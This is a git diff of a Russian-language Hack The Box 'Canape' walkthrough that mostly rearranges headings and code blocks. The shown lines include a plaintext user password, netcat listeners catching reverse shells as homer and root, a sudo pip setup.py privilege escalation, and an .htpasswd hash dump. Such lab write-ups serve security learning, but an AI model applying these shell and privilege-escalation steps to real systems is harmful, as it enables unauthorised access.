@@ -567,7 +567,6 @@ homer:x:1000:1000:homer,,,:/home/homer:/bin/bash
 
 И забираем флаг:
 
-### user.txt
 ```text
 www-data@canape:/$ su - homer
 Password: 0B4jyA0xtytZi7esBNGp
@@ -577,7 +576,10 @@ homer
 
 homer@canape:~$ id
 uid=1000(homer) gid=1000(homer) groups=1000(homer)
+```
 
+### user.txt
+```text
 homer@canape:~$ cat /home/homer/user.txt
 bce91869????????????????????????
 ```
@@ -631,7 +633,6 @@ Eshell V7.3  (abort with ^G)
 
 И последней командой получим свой реверс-шелл от пользователя homer:
 
-### user.txt
 ```text
 root@kali:~# nc -nlvvp 1337
 Ncat: Version 7.70 ( https://nmap.org/ncat )
@@ -647,7 +648,9 @@ homer
 homer@canape:~$ id
 id
 uid=1000(homer) gid=1000(homer) groups=1000(homer)
+```
 
+```text
 homer@canape:~$ cat /home/homer/user.txt
 cat /home/homer/user.txt
 bce91869????????????????????????
@@ -694,7 +697,6 @@ setup(
 )
 ```
 
-### root.txt
 ```text
 homer@canape:/dev/shm$ ls
 setup.py
@@ -705,7 +707,10 @@ Processing /dev/shm
 Installing collected packages: UNKNOWN
   Running setup.py install for UNKNOWN ... done
 Successfully installed UNKNOWN
+```
 
+### root.txt
+```text
 homer@canape:/dev/shm$ cat PWNED
 928c3df1????????????????????????
 ```
@@ -747,7 +752,6 @@ Installing collected packages: UNKNOWN
   Running setup.py install for UNKNOWN ... -
 ```
 
-### root.txt
 ```text
 root@kali:~# nc -nlvvp 1337
 Ncat: Version 7.70 ( https://nmap.org/ncat )
@@ -765,13 +769,14 @@ root
 root@canape:~# id
 id
 uid=0(root) gid=0(root) groups=0(root)
+```
 
+```text
 root@canape:~# cat /root/root.txt
 cat /root/root.txt
 928c3df1????????????????????????
 ```
 
-### root.txt
 3\. Можно подурачиться:
 ```text
 homer@canape:~$ sudo -H /usr/bin/pip install -r /root/root.txt
@@ -819,17 +824,23 @@ drwxr-xr-x 3 www-data www-data 4096 Jan 23  2018 .
 drwxr-xr-x 4 root     root     4096 Jan 23  2018 ..
 -rw-r--r-- 1 root     root       50 Jan 23  2018 .htpasswd
 drwxrwsr-x 7 www-data www-data 4096 Jan 23  2018 simpsons.git
+```
 
+```text
 homer@canape:/var/www$ cat git/.htpasswd
 homer:Git Access:7818cef8b9dc50f4a70fd299314cb9eb
+```
 
+```text
 homer@canape:/var/www$ ls -la html/
 total 16
 drwxr-xr-x 3 homer homer 4096 Jan 15  2018 .
 drwxr-xr-x 4 root  root  4096 Jan 23  2018 ..
 drwxr-xr-x 5 homer homer 4096 Apr 10 13:25 simpsons
 -rw-r--r-- 1 homer homer  215 Jan 14  2018 simpsons.wsgi
+```
 
+```text
 homer@canape:/var/www$ cat html/simpsons.wsgi
 #!/usr/bin/python
 import sys
